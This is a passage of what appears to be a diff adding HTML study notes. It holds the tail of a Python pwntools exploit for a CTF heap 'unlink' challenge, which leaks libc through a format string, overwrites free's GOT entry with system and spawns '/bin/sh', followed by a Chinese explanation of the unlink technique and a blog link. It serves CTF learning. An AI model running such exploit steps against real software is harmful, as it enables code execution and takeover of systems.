+edit(3,p64(0x6020e8))&#13;
+edit(0,'%llx.'*30)&#13;
+#free-&gt;puts&#13;
+print conn.recvuntil('&gt;&gt;')&#13;
+conn.sendline('4')&#13;
+print conn.recvuntil('note:')&#13;
+conn.sendline(str(0))&#13;
+#time.sleep(0.3)&#13;
+ret =  conn.recvuntil('success')&#13;
+print ret&#13;
+# 6. calcuate the system's addr&#13;
+libcstart = ret.split('.')[10]&#13;
+libcstart_2 = int(libcstart,16) - libcstartmain_ret_off&#13;
+print 'libc start addr:',hex(libcstart_2)&#13;
+system_addr = libcstart_2 + sys_off&#13;
+print 'system_addr:',hex(system_addr)&#13;
+# 7. overwrite free's got&#13;
+edit(3,free_got)&#13;
+edit(0,p64(system_addr)+printf_plt)&#13;
+# 8. write argv&#13;
+edit(3,p64(0x6020d0))&#13;
+edit(0,'/bin/sh\0')&#13;
+# 9. exploit&#13;
+print conn.recvuntil('&gt;&gt;')&#13;
+conn.sendline('4')&#13;
+print conn.recvuntil('note:')&#13;
+conn.sendline(str(0))&#13;
+sleep(0.2)&#13;
+conn.interactive()</a>
+</h3>
+<h3 class="topic">
+<a name="0837o9p72kdje3pdkuge7fvkqc">&nbsp;&nbsp;&nbsp;Unlink题目的特点是一般都会存在一个数组，用于记录所有被申请的chunk的用户空间首地址，存在堆溢出漏洞，允许将数据溢出到相邻堆块，一般在溢出数据中构造虚假的chunk，并通过溢出修改相邻chunk的pre_size和size字段，从而当释放下相邻chunk时，引发虚假chunk的堆块合并，利用该虚假堆块中的fd bk指针修改数据段中（一般为bss段）的chunk用户空间指针数组的内容，这就要求这里的fd，bk指针是基于该指针数据地址进行构造，当chunk用户空间指针数组中的数据被改写，引用程序中的堆块内容编辑功能就可以修改整个指针数组，从而达到任意地址写任意数据的目的，进一步就可以将指定函数got表项改写为其他函数，从而完成l函数地址泄露与ibc基址确定，进一步确定system函数和"/bin/sh"字符串的地址</a>
+</h3>
+<h3 class="topic">
+<a href="https://blog.csdn.net/weixin_38419913/article/details/103381531" name="5622fmasbnab88fk3t4n8lg3dp">&nbsp;&nbsp;&nbsp;https://blog.csdn.net/weixin_38419913/article/details/103381531</a>
+</h3>
+</body>
+</html>
